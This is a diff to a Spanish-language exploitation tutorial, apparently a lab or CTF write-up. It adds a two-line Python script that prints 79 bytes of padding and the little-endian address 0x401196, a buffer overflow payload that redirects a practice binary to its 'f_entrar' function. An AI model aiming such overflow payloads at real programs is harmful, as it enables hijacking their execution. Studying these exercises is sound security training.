@@ -47,9 +47,10 @@ Ahora veremos cuál es la dirección de la función 'f_entrar' que imprime 'Pasa
 
 ![7](Capturas/7.png)
 
-Comienza en 0x401196, por lo tanto, nuestro script será el siguiente:
+Comienza en 0x401196 teniendo en cuenta el endian, nuestro script será el siguiente:
 ```
-
+#!/usr/bin/python
+print ('X' * 79 + "\x96\x11\x40\x00")
 ```
-
+![8](Capturas/8.png)
 
